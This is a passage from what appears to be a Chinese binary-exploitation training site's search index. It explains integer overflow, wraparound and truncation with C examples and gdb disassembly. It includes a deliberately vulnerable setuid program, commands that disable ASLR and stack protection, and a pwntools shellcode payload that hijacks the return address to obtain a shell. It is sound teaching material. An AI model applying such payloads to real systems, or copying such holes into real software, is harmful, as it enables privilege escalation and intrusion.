ILP32\uff0c\u5373\u6574\u6570\uff08Int\uff09\u3001\u957f\u6574\u6570\uff08Long\uff09\u548c\u6307\u9488\uff08Pointer\uff09\u90fd\u662f 32 \u4f4d\u3002\uff09</p>"},{"location":"Training/Material/Binary%20Exploitation/#_15","title":"\u6574\u6570\u6ea2\u51fa\u7684\u5371\u5bb3","text":"<p>\u5982\u679c\u4e00\u4e2a\u6574\u6570\u7528\u6765\u8ba1\u7b97\u4e00\u4e9b\u654f\u611f\u6570\u503c\uff0c\u5982\u7f13\u51b2\u533a\u5927\u5c0f\u6216\u6570\u503c\u7d22\u5f15\uff0c\u5c31\u4f1a\u4ea7\u751f\u6f5c\u5728\u7684\u5371\u9669\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6574\u6570\u6ea2\u51fa\u5e76\u6ca1\u6709\u6539\u5199\u989d\u5916\u7684\u5185\u5b58\uff0c\u4e0d\u4f1a\u76f4\u63a5\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u4f46\u662f\u5b83\u4f1a\u5bfc\u81f4\u6808\u6ea2\u51fa\u548c\u5806\u6ea2\u51fa\uff0c\u800c\u540e\u4e24\u8005\u90fd\u4f1a\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u7531\u4e8e\u6574\u6570\u6ea2\u51fa\u51fa\u73b0\u4e4b\u540e\uff0c\u5f88\u96be\u88ab\u7acb\u5373\u5bdf\u89c9\uff0c\u6bd4\u8f83\u96be\u7528\u4e00\u4e2a\u6709\u6548\u7684\u65b9\u6cd5\u53bb\u5224\u65ad\u662f\u5426\u51fa\u73b0\u6216\u8005\u53ef\u80fd\u51fa\u73b0\u6574\u6570\u6ea2\u51fa\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_16","title":"\u6574\u6570\u6ea2\u51fa","text":"<p>\u5173\u4e8e\u6574\u6570\u7684\u5f02\u5e38\u60c5\u51b5\u4e3b\u8981\u6709\u4e09\u79cd\uff1a</p> <ul> <li>\u6ea2\u51fa</li> <li>\u53ea\u6709\u6709\u7b26\u53f7\u6570\u624d\u4f1a\u53d1\u751f\u6ea2\u51fa\u3002\u6709\u7b26\u53f7\u6570\u6700\u9ad8\u4f4d\u8868\u793a\u7b26\u53f7\uff0c\u5728\u4e24\u6b63\u6216\u4e24\u8d1f\u76f8\u52a0\u65f6\uff0c\u6709\u53ef\u80fd\u6539\u53d8\u7b26\u53f7\u4f4d\u7684\u503c\uff0c\u4ea7\u751f\u6ea2\u51fa</li> <li>\u6ea2\u51fa\u6807\u5fd7 <code>OF</code> \u53ef\u68c0\u6d4b\u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa</li> <li>\u56de\u7ed5</li> <li>\u65e0\u7b26\u53f7\u6570 <code>0-1</code> \u65f6\u4f1a\u53d8\u6210\u6700\u5927\u7684\u6570\uff0c\u5982 1 \u5b57\u8282\u7684\u65e0\u7b26\u53f7\u6570\u4f1a\u53d8\u4e3a <code>255</code>\uff0c\u800c <code>255+1</code> \u4f1a\u53d8\u6210\u6700\u5c0f\u6570 <code>0</code>\u3002</li> <li>\u8fdb\u4f4d\u6807\u5fd7 <code>CF</code> \u53ef\u68c0\u6d4b\u65e0\u7b26\u53f7\u6570\u7684\u56de\u7ed5</li> <li>\u622a\u65ad</li> <li>\u5c06\u4e00\u4e2a\u8f83\u5927\u5bbd\u5ea6\u7684\u6570\u5b58\u5165\u4e00\u4e2a\u5bbd\u5ea6\u5c0f\u7684\u64cd\u4f5c\u6570\u4e2d\uff0c\u9ad8\u4f4d\u53d1\u751f\u622a\u65ad</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_17","title":"\u6709\u7b26\u53f7\u6574\u6570\u6ea2\u51fa","text":"<ul> <li>\u4e0a\u6ea2\u51fa</li> </ul> <pre><code>int i;\ni = INT_MAX;  // 2 147 483 647\ni++;\nprintf(\"i = %d\\n\", i);  // i = -2 147 483 648\n</code></pre> <ul> <li>\u4e0b\u6ea2\u51fa</li> </ul> <pre><code>i = INT_MIN;  // -2 147 483 648\ni--;\nprintf(\"i = %d\\n\", i);  // i = 2 147 483 647\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#_18","title":"\u65e0\u7b26\u53f7\u6570\u56de\u7ed5","text":"<p>\u6d89\u53ca\u65e0\u7b26\u53f7\u6570\u7684\u8ba1\u7b97\u6c38\u8fdc\u4e0d\u4f1a\u6ea2\u51fa\uff0c\u56e0\u4e3a\u4e0d\u80fd\u7528\u7ed3\u679c\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\u8868\u793a\u7684\u7ed3\u679c\u503c\u88ab\u8be5\u7c7b\u578b\u53ef\u4ee5\u8868\u793a\u7684\u6700\u5927\u503c\u52a0 1 \u4e4b\u548c\u53d6\u6a21\u51cf\uff08reduced modulo\uff09\u3002\u56e0\u4e3a\u56de\u7ed5\uff0c\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\u8868\u8fbe\u5f0f\u6c38\u8fdc\u65e0\u6cd5\u6c42\u51fa\u5c0f\u4e8e\u96f6\u7684\u503c\u3002</p> <p>\u4f7f\u7528\u4e0b\u56fe\u76f4\u89c2\u5730\u7406\u89e3\u56de\u7ed5\uff0c\u5728\u8f6e\u4e0a\u6309\u987a\u65f6\u9488\u65b9\u5411\u5c06\u503c\u9012\u589e\u4ea7\u751f\u7684\u503c\u7d27\u6328\u7740\u5b83\uff1a</p> <p></p> <pre><code>unsigned int ui;\nui = UINT_MAX;  // \u5728 x86-32 \u4e0a\u4e3a 4 294 967 295\nui++;\nprintf(\"ui = %u\\n\", ui);  // ui = 0\nui = 0;\nui--;\nprintf(\"ui = %u\\n\", ui);  // \u5728 x86-32 \u4e0a\uff0cui = 4 294 967 295\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#_19","title":"\u622a\u65ad","text":"<ul> <li>\u52a0\u6cd5\u622a\u65ad\uff1a</li> </ul> <pre><code>0xffffffff + 0x00000001\n= 0x0000000100000000 (long long)\n= 0x00000000 (long)\n</code></pre> <ul> <li>\u4e58\u6cd5\u622a\u65ad\uff1a</li> </ul> <pre><code>0x00123456 * 0x00654321\n= 0x000007336BF94116 (long long)\n= 0x6BF94116 (long)\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#_20","title":"\u6574\u578b\u63d0\u5347\u548c\u5bbd\u5ea6\u6ea2\u51fa","text":"<p>\u6574\u578b\u63d0\u5347\u662f\u6307\u5f53\u8ba1\u7b97\u8868\u8fbe\u5f0f\u4e2d\u5305\u542b\u4e86\u4e0d\u540c\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570\u65f6\uff0c\u8f83\u5c0f\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570\u4f1a\u88ab\u63d0\u5347\u5230\u548c\u8f83\u5927\u64cd\u4f5c\u6570\u4e00\u6837\u7684\u5bbd\u5ea6\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8ba1\u7b97\u3002</p> <p>\u793a\u4f8b\uff1a\u6e90\u7801</p> <pre><code>#include&lt;stdio.h&gt;\nvoid main() {\n    int l;  \n    short s;\n    char c;\n\n    l = 0xabcddcba;\n    s = l;\n    c = l;\n\n    printf(\"\u5bbd\u5ea6\u6ea2\u51fa\\n\");\n    printf(\"l = 0x%x (%d bits)\\n\", l, sizeof(l) * 8);\n    printf(\"s = 0x%x (%d bits)\\n\", s, sizeof(s) * 8);\n    printf(\"c = 0x%x (%d bits)\\n\", c, sizeof(c) * 8);\n\n    printf(\"\u6574\u578b\u63d0\u5347\\n\");\n    printf(\"s + c = 0x%x (%d bits)\\n\", s+c, sizeof(s+c) * 8);\n}\n$ ./a.out\n\u5bbd\u5ea6\u6ea2\u51fa\nl = 0xabcddcba (32 bits)\ns = 0xffffdcba (16 bits)\nc = 0xffffffba (8 bits)\n\u6574\u578b\u63d0\u5347\ns + c = 0xffffdc74 (32 bits)\n</code></pre> <p>\u4f7f\u7528 gdb \u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff1a</p> <pre><code>gdb-peda$ disassemble main\nDump of assembler code for function main:\n   0x0000056d &lt;+0&gt;:     lea    ecx,[esp+0x4]\n   0x00000571 &lt;+4&gt;:     and    esp,0xfffffff0\n   0x00000574 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]\n   0x00000577 &lt;+10&gt;:    push   ebp\n   0x00000578 &lt;+11&gt;:    mov    ebp,esp\n   0x0000057a &lt;+13&gt;:    push   ebx\n   0x0000057b &lt;+14&gt;:    push   ecx\n   0x0000057c &lt;+15&gt;:    sub    esp,0x10\n   0x0000057f &lt;+18&gt;:    call   0x470 &lt;__x86.get_pc_thunk.bx&gt;\n   0x00000584 &lt;+23&gt;:    add    ebx,0x1a7c\n   0x0000058a &lt;+29&gt;:    mov    DWORD PTR [ebp-0xc],0xabcddcba\n   0x00000591 &lt;+36&gt;:    mov    eax,DWORD PTR [ebp-0xc]\n   0x00000594 &lt;+39&gt;:    mov    WORD PTR [ebp-0xe],ax\n   0x00000598 &lt;+43&gt;:    mov    eax,DWORD PTR [ebp-0xc]\n   0x0000059b &lt;+46&gt;:    mov    BYTE PTR [ebp-0xf],al\n   0x0000059e &lt;+49&gt;:    sub    esp,0xc\n   0x000005a1 &lt;+52&gt;:    lea    eax,[ebx-0x1940]\n   0x000005a7 &lt;+58&gt;:    push   eax\n   0x000005a8 &lt;+59&gt;:    call   0x400 &lt;puts@plt&gt;\n   0x000005ad &lt;+64&gt;:    add    esp,0x10\n   0x000005b0 &lt;+67&gt;:    sub    esp,0x4\n   0x000005b3 &lt;+70&gt;:    push   0x20\n   0x000005b5 &lt;+72&gt;:    push   DWORD PTR [ebp-0xc]\n   0x000005b8 &lt;+75&gt;:    lea    eax,[ebx-0x1933]\n   0x000005be &lt;+81&gt;:    push   eax\n   0x000005bf &lt;+82&gt;:    call   0x3f0 &lt;printf@plt&gt;\n   0x000005c4 &lt;+87&gt;:    add    esp,0x10\n   0x000005c7 &lt;+90&gt;:    movsx  eax,WORD PTR [ebp-0xe]\n   0x000005cb &lt;+94&gt;:    sub    esp,0x4\n   0x000005ce &lt;+97&gt;:    push   0x10\n   0x000005d0 &lt;+99&gt;:    push   eax\n   0x000005d1 &lt;+100&gt;:   lea    eax,[ebx-0x191f]\n   0x000005d7 &lt;+106&gt;:   push   eax\n   0x000005d8 &lt;+107&gt;:   call   0x3f0 &lt;printf@plt&gt;\n   0x000005dd &lt;+112&gt;:   add    esp,0x10\n   0x000005e0 &lt;+115&gt;:   movsx  eax,BYTE PTR [ebp-0xf]\n   0x000005e4 &lt;+119&gt;:   sub    esp,0x4\n   0x000005e7 &lt;+122&gt;:   push   0x8\n   0x000005e9 &lt;+124&gt;:   push   eax\n   0x000005ea &lt;+125&gt;:   lea    eax,[ebx-0x190b]\n   0x000005f0 &lt;+131&gt;:   push   eax\n   0x000005f1 &lt;+132&gt;:   call   0x3f0 &lt;printf@plt&gt;\n   0x000005f6 &lt;+137&gt;:   add    esp,0x10\n   0x000005f9 &lt;+140&gt;:   sub    esp,0xc\n   0x000005fc &lt;+143&gt;:   lea    eax,[ebx-0x18f7]\n   0x00000602 &lt;+149&gt;:   push   eax\n   0x00000603 &lt;+150&gt;:   call   0x400 &lt;puts@plt&gt;\n   0x00000608 &lt;+155&gt;:   add    esp,0x10\n   0x0000060b &lt;+158&gt;:   movsx  edx,WORD PTR [ebp-0xe]\n   0x0000060f &lt;+162&gt;:   movsx  eax,BYTE PTR [ebp-0xf]\n   0x00000613 &lt;+166&gt;:   add    eax,edx\n   0x00000615 &lt;+168&gt;:   sub    esp,0x4\n   0x00000618 &lt;+171&gt;:   push   0x20\n   0x0000061a &lt;+173&gt;:   push   eax\n   0x0000061b &lt;+174&gt;:   lea    eax,[ebx-0x18ea]\n   0x00000621 &lt;+180&gt;:   push   eax\n   0x00000622 &lt;+181&gt;:   call   0x3f0 &lt;printf@plt&gt;\n   0x00000627 &lt;+186&gt;:   add    esp,0x10\n   0x0000062a &lt;+189&gt;:   nop\n   0x0000062b &lt;+190&gt;:   lea    esp,[ebp-0x8]\n   0x0000062e &lt;+193&gt;:   pop    ecx\n   0x0000062f &lt;+194&gt;:   pop    ebx\n   0x00000630 &lt;+195&gt;:   pop    ebp\n   0x00000631 &lt;+196&gt;:   lea    esp,[ecx-0x4]\n   0x00000634 &lt;+199&gt;:   ret\nEnd of assembler dump.\n</code></pre> <p>\u5728\u6574\u6570\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u53ef\u80fd\u5bfc\u81f4\u4e0b\u9762\u7684\u9519\u8bef\uff1a</p> <ul> <li>\u635f\u5931\u503c\uff1a\u8f6c\u6362\u4e3a\u503c\u7684\u5927\u5c0f\u4e0d\u80fd\u8868\u793a\u7684\u4e00\u79cd\u7c7b\u578b</li> <li>\u635f\u5931\u7b26\u53f7\uff1a\u4ece\u6709\u7b26\u53f7\u7c7b\u578b\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u7c7b\u578b\uff0c\u5bfc\u81f4\u635f\u5931\u7b26\u53f7</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#_21","title":"\u6f0f\u6d1e\u591a\u53d1\u51fd\u6570","text":"<p>\u6211\u4eec\u8bf4\u8fc7\u6574\u6570\u6ea2\u51fa\u8981\u914d\u5408\u4e0a\u5176\u4ed6\u7c7b\u578b\u7684\u7f3a\u9677\u624d\u80fd\u6709\u7528\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u51fd\u6570\u90fd\u6709\u4e00\u4e2a <code>size_t</code> \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e38\u5e38\u88ab\u8bef\u7528\u800c\u4ea7\u751f\u6574\u6570\u6ea2\u51fa\uff0c\u63a5\u7740\u5c31\u53ef\u80fd\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002</p> <pre><code>#include &lt;string.h&gt;\n\nvoid *memcpy(void *dest, const void *src, size_t n);\n</code></pre> <p><code>memcpy()</code> \u51fd\u6570\u5c06 <code>src</code> \u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u4e2d\u4ee5 <code>src</code> \u5730\u5740\u5f00\u59cb\u7684\u524d <code>n</code> \u4e2a\u5b57\u8282\u590d\u5236\u5230 <code>dest</code> \u6240\u6307\u7684\u6570\u7ec4\u4e2d\uff0c\u5e76\u8fd4\u56de <code>dest</code>\u3002</p> <pre><code>#include &lt;string.h&gt;\n\nchar *strncpy(char *dest, const char *src, size_t n);\n</code></pre> <p><code>strncpy()</code> \u51fd\u6570\u4ece\u6e90 <code>src</code> \u6240\u6307\u7684\u5185\u5b58\u5730\u5740\u7684\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u590d\u5236 <code>n</code> \u4e2a\u5b57\u8282\u5230\u76ee\u6807 <code>dest</code> \u6240\u6307\u7684\u5185\u5b58\u5730\u5740\u7684\u8d77\u59cb\u4f4d\u7f6e\u4e2d\u3002</p> <p>\u4e24\u4e2a\u51fd\u6570\u4e2d\u90fd\u6709\u4e00\u4e2a\u7c7b\u578b\u4e3a <code>size_t</code> \u7684\u53c2\u6570\uff0c\u5b83\u662f\u65e0\u7b26\u53f7\u6574\u578b\u7684 <code>sizeof</code> \u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\u3002</p> <pre><code>typedef unsigned int size_t;\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#_22","title":"\u6574\u6570\u6ea2\u51fa\u793a\u4f8b","text":"<p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406\u548c\u4e3b\u8981\u5f62\u5f0f\uff0c\u4e0b\u9762\u6211\u4eec\u5148\u770b\u51e0\u4e2a\u7b80\u5355\u793a\u4f8b\uff0c\u7136\u540e\u5b9e\u9645\u64cd\u4f5c\u5229\u7528\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_23","title":"\u793a\u4f8b","text":"<p>\u793a\u4f8b\u4e00\uff0c\u6574\u6570\u8f6c\u6362\uff1a</p> <pre><code>char buf[80];\nvoid vulnerable() {\n    int len = read_int_from_network();\n    char *p = read_string_from_network();\n    if (len &gt; 80) {\n        error(\"length too large: bad dog, no cookie for you!\");\n        return;\n    }\n    memcpy(buf, p, len);\n}\n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u653b\u51fb\u8005\u7ed9 <code>len</code> \u8d4b\u4e8e\u4e86\u4e00\u4e2a\u8d1f\u6570\uff0c\u5219\u53ef\u4ee5\u7ed5\u8fc7 <code>if</code> \u8bed\u53e5\u7684\u68c0\u6d4b\uff0c\u800c\u6267\u884c\u5230 <code>memcpy()</code> \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f <code>size_t</code> \u7c7b\u578b\uff0c\u8d1f\u6570 <code>len</code> \u4f1a\u88ab\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u578b\uff0c\u5b83\u53ef\u80fd\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6b63\u6570\uff0c\u4ece\u800c\u590d\u5236\u4e86\u5927\u91cf\u7684\u5185\u5bb9\u5230 <code>buf</code> \u4e2d\uff0c\u5f15\u53d1\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u3002</p> <p>\u793a\u4f8b\u4e8c\uff0c\u56de\u7ed5\u548c\u6ea2\u51fa\uff1a</p> <pre><code>void vulnerable() {\n    size_t len;\n    // int len;\n    char* buf;\n\n    len = read_int_from_network();\n    buf = malloc(len + 5);\n    read(fd, buf, len);\n    ...\n}\n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u770b\u4f3c\u907f\u5f00\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4f46\u662f\u5982\u679c <code>len</code> \u8fc7\u5927\uff0c<code>len+5</code> \u6709\u53ef\u80fd\u53d1\u751f\u56de\u7ed5\u3002\u6bd4\u5982\u8bf4\uff0c\u5728 x86-32 \u4e0a\uff0c\u5982\u679c <code>len = 0xFFFFFFFF</code>\uff0c\u5219 <code>len+5 = 0x00000004</code>\uff0c\u8fd9\u65f6 <code>malloc()</code> \u53ea\u5206\u914d\u4e86 4 \u5b57\u8282\u7684\u5185\u5b58\u533a\u57df\uff0c\u7136\u540e\u5728\u91cc\u9762\u5199\u5165\u5927\u91cf\u7684\u6570\u636e\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u4e5f\u5c31\u53d1\u751f\u4e86\u3002\uff08\u5982\u679c\u5c06 <code>len</code> \u58f0\u660e\u4e3a\u6709\u7b26\u53f7 <code>int</code> \u7c7b\u578b\uff0c<code>len+5</code> \u53ef\u80fd\u53d1\u751f\u6ea2\u51fa\uff09</p> <p>\u793a\u4f8b\u4e09\uff0c\u622a\u65ad\uff1a</p> <pre><code>void main(int argc, char *argv[]) {\n    unsigned short int total;\n    total = strlen(argv[1]) + strlen(argv[2]) + 1;\n    char *buf = (char *)malloc(total);\n    strcpy(buf, argv[1]);\n    strcat(buf, argv[2]);\n    ...\n}\n</code></pre> <p>\u8fd9\u4e2a\u4f8b\u5b50\u63a5\u53d7\u4e24\u4e2a\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u53c2\u6570\u5e76\u8ba1\u7b97\u5b83\u4eec\u7684\u603b\u957f\u5ea6\uff0c\u7a0b\u5e8f\u5206\u914d\u8db3\u591f\u7684\u5185\u5b58\u6765\u5b58\u50a8\u62fc\u63a5\u540e\u7684\u5b57\u7b26\u4e32\u3002\u9996\u5148\u5c06\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u590d\u5236\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u7136\u540e\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fde\u63a5\u5230\u5c3e\u90e8\u3002\u5982\u679c\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u4e24\u4e2a\u5b57\u7b26\u4e32\u603b\u957f\u5ea6\u65e0\u6cd5\u7528 <code>total</code> \u8868\u793a\uff0c\u5219\u4f1a\u53d1\u751f\u622a\u65ad\uff0c\u4ece\u800c\u5bfc\u81f4\u540e\u9762\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#_24","title":"\u5b9e\u6218","text":"<p>\u770b\u4e86\u4e0a\u9762\u7684\u793a\u4f8b\uff0c\u6211\u4eec\u6765\u771f\u6b63\u5229\u7528\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6e90\u7801</p> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nvoid validate_passwd(char *passwd) {\n    char passwd_buf[11];\n    unsigned char passwd_len = strlen(passwd);\n    if(passwd_len &gt;= 4 &amp;&amp; passwd_len &lt;= 8) {\n        printf(\"good!\\n\");\n        strcpy(passwd_buf, passwd);\n    } else {\n        printf(\"bad!\\n\");\n    }\n}\n\nint main(int argc, char *argv[]) {\n    if(argc != 2) {\n        printf(\"error\\n\");\n        return 0;\n    }\n    validate_passwd(argv[1]);\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u7a0b\u5e8f\u4e2d <code>strlen()</code> \u8fd4\u56de\u7c7b\u578b\u662f <code>size_t</code>\uff0c\u5374\u88ab\u5b58\u50a8\u5728\u65e0\u7b26\u53f7\u5b57\u7b26\u4e32\u7c7b\u578b\u4e2d\uff0c\u4efb\u610f\u8d85\u8fc7\u65e0\u7b26\u53f7\u5b57\u7b26\u4e32\u6700\u5927\u4e0a\u9650\u503c\uff08256 \u5b57\u8282\uff09\u7684\u6570\u636e\u90fd\u4f1a\u5bfc\u81f4\u622a\u65ad\u5f02\u5e38\u3002\u5f53\u5bc6\u7801\u957f\u5ea6\u4e3a 261 \u65f6\uff0c\u622a\u65ad\u540e\u503c\u53d8\u4e3a 5\uff0c\u6210\u529f\u7ed5\u8fc7\u4e86 <code>if</code> \u7684\u5224\u65ad\uff0c\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002\u4e0b\u9762\u6211\u4eec\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6765\u83b7\u5f97 shell\u3002</p> <p>\u7f16\u8bd1\u547d\u4ee4\uff1a</p> <pre><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space\n$ gcc -g -fno-stack-protector -z execstack vuln.c\n$ sudo chown root vuln\n$ sudo chgrp root vuln\n$ sudo chmod +s vuln\n</code></pre> <p>\u4f7f\u7528 gdb \u53cd\u6c47\u7f16 <code>validate_passwd</code> \u51fd\u6570\u3002</p> <pre><code>gdb-peda$ disassemble validate_passwd\nDump of assembler code for function validate_passwd:\n   0x0000059d &lt;+0&gt;:     push   ebp                            ; \u538b\u5165 ebp\n   0x0000059e &lt;+1&gt;:     mov    ebp,esp\n   0x000005a0 &lt;+3&gt;:     push   ebx                            ; \u538b\u5165 ebx\n   0x000005a1 &lt;+4&gt;:     sub    esp,0x14\n   0x000005a4 &lt;+7&gt;:     call   0x4a0 &lt;__x86.get_pc_thunk.bx&gt;\n   0x000005a9 &lt;+12&gt;:    add    ebx,0x1a57\n   0x000005af &lt;+18&gt;:    sub    esp,0xc\n   0x000005b2 &lt;+21&gt;:    push   DWORD PTR [ebp+0x8]\n   0x000005b5 &lt;+24&gt;:    call   0x430 &lt;strlen@plt&gt;\n   0x000005ba &lt;+29&gt;:    add    esp,0x10\n   0x000005bd &lt;+32&gt;:    mov    BYTE PTR [ebp-0x9],al         ; \u5c06 len \u5b58\u5165 [ebp-0x9]\n   0x000005c0 &lt;+35&gt;:    cmp    BYTE PTR [ebp-0x9],0x3\n   0x000005c4 &lt;+39&gt;:    jbe    0x5f2 &lt;validate_passwd+85&gt;\n   0x000005c6 &lt;+41&gt;:    cmp    BYTE PTR [ebp-0x9],0x8\n   0x000005ca &lt;+45&gt;:    ja     0x5f2 &lt;validate_passwd+85&gt;\n   0x000005cc &lt;+47&gt;:    sub    esp,0xc\n   0x000005cf &lt;+50&gt;:    lea    eax,[ebx-0x1910]\n   0x000005d5 &lt;+56&gt;:    push   eax\n   0x000005d6 &lt;+57&gt;:    call   0x420 &lt;puts@plt&gt;\n   0x000005db &lt;+62&gt;:    add    esp,0x10\n   0x000005de &lt;+65&gt;:    sub    esp,0x8\n   0x000005e1 &lt;+68&gt;:    push   DWORD PTR [ebp+0x8]\n   0x000005e4 &lt;+71&gt;:    lea    eax,[ebp-0x14]                ; \u53d6 passwd_buf \u5730\u5740\n   0x000005e7 &lt;+74&gt;:    push   eax                           ; \u538b\u5165 passwd_buf\n   0x000005e8 &lt;+75&gt;:    call   0x410 &lt;strcpy@plt&gt;\n   0x000005ed &lt;+80&gt;:    add    esp,0x10\n   0x000005f0 &lt;+83&gt;:    jmp    0x604 &lt;validate_passwd+103&gt;\n   0x000005f2 &lt;+85&gt;:    sub    esp,0xc\n   0x000005f5 &lt;+88&gt;:    lea    eax,[ebx-0x190a]\n   0x000005fb &lt;+94&gt;:    push   eax\n   0x000005fc &lt;+95&gt;:    call   0x420 &lt;puts@plt&gt;\n   0x00000601 &lt;+100&gt;:   add    esp,0x10\n   0x00000604 &lt;+103&gt;:   nop\n   0x00000605 &lt;+104&gt;:   mov    ebx,DWORD PTR [ebp-0x4]\n   0x00000608 &lt;+107&gt;:   leave  \n   0x00000609 &lt;+108&gt;:   ret\nEnd of assembler dump.\n</code></pre> <p>\u901a\u8fc7\u9605\u8bfb\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u6211\u4eec\u77e5\u9053\u7f13\u51b2\u533a <code>passwd_buf</code> \u4f4d\u4e8e <code>ebp=0x14</code> \u7684\u4f4d\u7f6e\uff08<code>0x000005e4 &lt;+71&gt;: lea eax,[ebp-0x14]</code>\uff09\uff0c\u800c\u8fd4\u56de\u5730\u5740\u5728 <code>ebp+4</code> \u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8e\u7f13\u51b2\u533a <code>0x18</code> \u7684\u4f4d\u7f6e\u3002\u6211\u4eec\u6d4b\u8bd5\u4e00\u4e0b\uff1a</p> <pre><code>gdb-peda$ r `python2 -c 'print \"A\"*24 + \"B\"*4 + \"C\"*233'`\nStarting program: /home/a.out `python2 -c 'print \"A\"*24 + \"B\"*4 + \"C\"*233'`\ngood!\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd0f4 ('A' &lt;repeats 24 times&gt;, \"BBBB\", 'C' &lt;repeats 172 times&gt;...)\nEBX: 0x41414141 ('AAAA')\nECX: 0xffffd490 --&gt; 0x534c0043 ('C')\nEDX: 0xffffd1f8 --&gt; 0xffff0043 --&gt; 0x0\nESI: 0xf7f95000 --&gt; 0x1bbd90\nEDI: 0x0\nEBP: 0x41414141 ('AAAA')\nESP: 0xffffd110 ('C' &lt;repeats 200 times&gt;...)\nEIP: 0x42424242 ('BBBB')\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x42424242\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd110 ('C' &lt;repeats 200 times&gt;...)\n0004| 0xffffd114 ('C' &lt;repeats 200 times&gt;...)\n0008| 0xffffd118 ('C' &lt;repeats 200 times&gt;...)\n0012| 0xffffd11c ('C' &lt;repeats 200 times&gt;...)\n0016| 0xffffd120 ('C' &lt;repeats 200 times&gt;...)\n0020| 0xffffd124 ('C' &lt;repeats 200 times&gt;...)\n0024| 0xffffd128 ('C' &lt;repeats 200 times&gt;...)\n0028| 0xffffd12c ('C' &lt;repeats 200 times&gt;...)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x42424242 in ?? ()\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>EIP</code> \u88ab <code>BBBB</code> \u8986\u76d6\uff0c\u76f8\u5f53\u4e8e\u6211\u4eec\u83b7\u5f97\u4e86\u8fd4\u56de\u5730\u5740\u7684\u63a7\u5236\u6743\u3002\u6784\u5efa\u4e0b\u9762\u7684 payload\uff1a</p> <pre><code>from pwn import *\n\nret_addr = 0xffffd118     # ebp = 0xffffd108\nshellcode = shellcraft.i386.sh()\n\npayload = \"A\" * 24\npayload += p32(ret_addr)\npayload += \"\\x90\" * 20\npayload += asm(shellcode)\npayload += \"C\" * 169      # 24 + 4 + 20 + 44 + 169 = 261\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#314-rop","title":"3.1.4 \u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff08ROP\uff09","text":"<ul> <li>ROP \u7b80\u4ecb</li> <li>\u5bfb\u627e gadgets</li> <li>\u5e38\u7528\u7684 gadgets</li> <li>ROP Emporium</li> <li>ret2win32</li> <li>ret2win</li> <li>split32</li> <li>split</li> <li>callme32</li> <li>callme</li> <li>write432</li> <li>write4</li> <li>badchars32</li> <li>badchars</li> <li>fluff32</li> <li>fluff</li> <li>pivot32</li> <li>pivot</li> <li>\u66f4\u591a\u8d44\u6599</li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#rop","title":"ROP 